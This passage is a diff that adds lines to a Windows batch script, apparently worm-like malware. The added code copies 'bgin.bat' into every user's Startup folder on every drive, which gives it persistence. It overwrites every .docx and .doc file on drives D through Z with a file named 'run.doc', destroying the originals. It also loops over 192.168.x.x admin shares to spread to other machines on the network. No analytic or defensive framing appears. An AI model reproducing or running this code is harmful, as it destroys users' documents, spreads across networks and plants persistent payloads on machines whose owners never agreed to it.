+if exist U: (for /f %%u in ('dir U:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "U:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist V: (for /f %%x in ('dir V:\Users /b') do mkdir "V:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist V: (for /f %%u in ('dir V:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "V:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist W: (for /f %%x in ('dir W:\Users /b') do mkdir "W:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist W: (for /f %%u in ('dir W:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "W:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist X: (for /f %%x in ('dir X:\Users /b') do mkdir "X:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist X: (for /f %%u in ('dir X:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "X:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Y: (for /f %%x in ('dir Y:\Users /b') do mkdir "Y:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Y: (for /f %%u in ('dir Y:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Y:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Z: (for /f %%x in ('dir Z:\Users /b') do mkdir "Z:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
+for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
+for /R "E:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h"
+for /R "F:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h"
+for /R "G:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
+for /R "H:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist I: (for /f "delims=" %%h in ('dir I:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "I:\%%h"
+for /R "I:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist J: (for /f "delims=" %%h in ('dir J:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "J:\%%h"
+for /R "J:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist K: (for /f "delims=" %%h in ('dir K:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "K:\%%h"
+for /R "K:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist L: (for /f "delims=" %%h in ('dir L:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "L:\%%h"
+for /R "L:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist M: (for /f "delims=" %%h in ('dir M:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "M:\%%h"
+for /R "M:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist N: (for /f "delims=" %%h in ('dir N:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "N:\%%h"
+for /R "N:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist O: (for /f "delims=" %%h in ('dir O:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "O:\%%h"
+for /R "O:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist P: (for /f "delims=" %%h in ('dir P:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "P:\%%h"
+for /R "P:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Q:\%%h"
+for /R "Q:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist R: (for /f "delims=" %%h in ('dir R:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "R:\%%h"
+for /R "R:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist S: (for /f "delims=" %%h in ('dir S:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "S:\%%h"
+for /R "S:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist T: (for /f "delims=" %%h in ('dir T:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "T:\%%h"
+for /R "T:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist U: (for /f "delims=" %%h in ('dir U:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "U:\%%h"
+for /R "U:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist V: (for /f "delims=" %%h in ('dir V:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "V:\%%h"
+for /R "V:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist W: (for /f "delims=" %%h in ('dir W:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "W:\%%h"
+for /R "W:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h"
+for /R "X:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h"
+for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h"
+for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
+if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
+if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h")
+if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h")
+if exist H: (for /f "delims=" %%h in ('dir H:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h")
+if exist I: (for /f "delims=" %%h in ('dir I:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "I:\%%h")
+if exist J: (for /f "delims=" %%h in ('dir J:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "J:\%%h")
+if exist K: (for /f "delims=" %%h in ('dir K:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "K:\%%h")
+if exist L: (for /f "delims=" %%h in ('dir L:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "L:\%%h")
+if exist M: (for /f "delims=" %%h in ('dir M:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "M:\%%h")
+if exist N: (for /f "delims=" %%h in ('dir N:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "N:\%%h")
+if exist O: (for /f "delims=" %%h in ('dir O:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "O:\%%h")
+if exist P: (for /f "delims=" %%h in ('dir P:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "P:\%%h")
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Q:\%%h")
+if exist R: (for /f "delims=" %%h in ('dir R:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "R:\%%h")
+if exist S: (for /f "delims=" %%h in ('dir S:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "S:\%%h")
+if exist T: (for /f "delims=" %%h in ('dir T:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "T:\%%h")
+if exist U: (for /f "delims=" %%h in ('dir U:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "U:\%%h")
+if exist V: (for /f "delims=" %%h in ('dir V:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "V:\%%h")
+if exist W: (for /f "delims=" %%h in ('dir W:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "W:\%%h")
+if exist X: (for /f "delims=" %%h in ('dir X:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
+pushd \\192.168.%i%.%ii%\C$
+if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist A: (for /f %%u in ('dir A:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "A:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist B: (for /f %%x in ('dir B:\Users /b') do mkdir "B:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist B: (for /f %%u in ('dir B:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "B:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist C: (for /f %%x in ('dir C:\Users /b') do mkdir "C:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist C: (for /f %%u in ('dir C:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "C:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist D: (for /f %%x in ('dir D:\Users /b') do mkdir "D:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist D: (for /f %%u in ('dir D:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "D:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist E: (for /f %%x in ('dir E:\Users /b') do mkdir "E:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist E: (for /f %%u in ('dir E:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "E:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist F: (for /f %%x in ('dir F:\Users /b') do mkdir "F:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist F: (for /f %%u in ('dir F:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "F:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist G: (for /f %%x in ('dir G:\Users /b') do mkdir "G:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist G: (for /f %%u in ('dir G:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "G:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist H: (for /f %%x in ('dir H:\Users /b') do mkdir "H:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist H: (for /f %%u in ('dir H:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "H:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist I: (for /f %%x in ('dir I:\Users /b') do mkdir "I:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist I: (for /f %%u in ('dir I:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "I:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist J: (for /f %%x in ('dir J:\Users /b') do mkdir "J:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist J: (for /f %%u in ('dir J:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "J:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist K: (for /f %%x in ('dir K:\Users /b') do mkdir "K:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist K: (for /f %%u in ('dir K:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "K:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist L: (for /f %%x in ('dir L:\Users /b') do mkdir "L:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist L: (for /f %%u in ('dir L:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "L:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist M: (for /f %%x in ('dir M:\Users /b') do mkdir "M:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist M: (for /f %%u in ('dir M:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "M:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist N: (for /f %%x in ('dir N:\Users /b') do mkdir "N:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist N: (for /f %%u in ('dir N:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "N:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist O: (for /f %%x in ('dir O:\Users /b') do mkdir "O:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist O: (for /f %%u in ('dir O:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "O:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist P: (for /f %%x in ('dir P:\Users /b') do mkdir "P:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist P: (for /f %%u in ('dir P:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "P:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Q: (for /f %%x in ('dir Q:\Users /b') do mkdir "Q:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Q: (for /f %%u in ('dir Q:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Q:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist R: (for /f %%x in ('dir R:\Users /b') do mkdir "R:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist R: (for /f %%u in ('dir R:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "R:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist S: (for /f %%x in ('dir S:\Users /b') do mkdir "S:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist S: (for /f %%u in ('dir S:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "S:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist T: (for /f %%x in ('dir T:\Users /b') do mkdir "T:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist T: (for /f %%u in ('dir T:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "T:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist U: (for /f %%x in ('dir U:\Users /b') do mkdir "U:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist U: (for /f %%u in ('dir U:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "U:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist V: (for /f %%x in ('dir V:\Users /b') do mkdir "V:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist V: (for /f %%u in ('dir V:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "V:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist W: (for /f %%x in ('dir W:\Users /b') do mkdir "W:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist W: (for /f %%u in ('dir W:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "W:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist X: (for /f %%x in ('dir X:\Users /b') do mkdir "X:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist X: (for /f %%u in ('dir X:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "X:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Y: (for /f %%x in ('dir Y:\Users /b') do mkdir "Y:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Y: (for /f %%u in ('dir Y:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Y:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist Z: (for /f %%x in ('dir Z:\Users /b') do mkdir "Z:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
+if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
+for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
+for /R "E:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h"
+for /R "F:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h"
+for /R "G:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
+for /R "H:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist I: (for /f "delims=" %%h in ('dir I:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "I:\%%h"
+for /R "I:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist J: (for /f "delims=" %%h in ('dir J:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "J:\%%h"
+for /R "J:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist K: (for /f "delims=" %%h in ('dir K:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "K:\%%h"
+for /R "K:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist L: (for /f "delims=" %%h in ('dir L:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "L:\%%h"
+for /R "L:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist M: (for /f "delims=" %%h in ('dir M:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "M:\%%h"
+for /R "M:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist N: (for /f "delims=" %%h in ('dir N:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "N:\%%h"
+for /R "N:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist O: (for /f "delims=" %%h in ('dir O:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "O:\%%h"
+for /R "O:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist P: (for /f "delims=" %%h in ('dir P:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "P:\%%h"
+for /R "P:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Q:\%%h"
+for /R "Q:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist R: (for /f "delims=" %%h in ('dir R:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "R:\%%h"
+for /R "R:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist S: (for /f "delims=" %%h in ('dir S:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "S:\%%h"
+for /R "S:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist T: (for /f "delims=" %%h in ('dir T:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "T:\%%h"
+for /R "T:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist U: (for /f "delims=" %%h in ('dir U:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "U:\%%h"
+for /R "U:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist V: (for /f "delims=" %%h in ('dir V:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "V:\%%h"
+for /R "V:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist W: (for /f "delims=" %%h in ('dir W:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "W:\%%h"
+for /R "W:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h"
+for /R "X:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h"
+for /R "Y:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h"
+for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
+if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
+if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h")
+if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h")
+if exist H: (for /f "delims=" %%h in ('dir H:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h")
+if exist I: (for /f "delims=" %%h in ('dir I:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "I:\%%h")
+if exist J: (for /f "delims=" %%h in ('dir J:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "J:\%%h")
+if exist K: (for /f "delims=" %%h in ('dir K:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "K:\%%h")
+if exist L: (for /f "delims=" %%h in ('dir L:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "L:\%%h")
+if exist M: (for /f "delims=" %%h in ('dir M:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "M:\%%h")
+if exist N: (for /f "delims=" %%h in ('dir N:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "N:\%%h")
+if exist O: (for /f "delims=" %%h in ('dir O:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "O:\%%h")
+if exist P: (for /f "delims=" %%h in ('dir P:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "P:\%%h")
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Q:\%%h")
+if exist R: (for /f "delims=" %%h in ('dir R:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "R:\%%h")
+if exist S: (for /f "delims=" %%h in ('dir S:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "S:\%%h")
+if exist T: (for /f "delims=" %%h in ('dir T:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "T:\%%h")
+if exist U: (for /f "delims=" %%h in ('dir U:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "U:\%%h")
+if exist V: (for /f "delims=" %%h in ('dir V:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "V:\%%h")
+if exist W: (for /f "delims=" %%h in ('dir W:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "W:\%%h")
+if exist X: (for /f "delims=" %%h in ('dir X:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h")
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Y:\%%h")
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
+
 popd
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
